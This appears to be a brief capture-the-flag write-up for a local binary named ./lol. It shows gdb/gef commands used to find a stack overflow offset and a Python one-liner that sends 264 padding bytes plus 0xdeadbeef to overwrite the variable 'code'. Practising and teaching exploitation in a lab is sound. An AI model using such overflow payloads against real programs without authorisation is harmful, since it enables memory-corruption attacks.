Run in gdb to figure out what is happening... Gosh it took me a long time to frigging configure gef

```
gdb -q ./lol
disassemble main
pattern create 700
run
pattern offset $rbp
(python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | ./lol
```

Realize that variable `code` is located at rbp -0x8\
Overwrite the variable, ironically called `code`.\
Find new location of rbp, at offset 272, likely little endian\
send random values to rbp -0x8 = 272- 8 = 264th location and send deadbeef in little endian format. Do this using python library sys

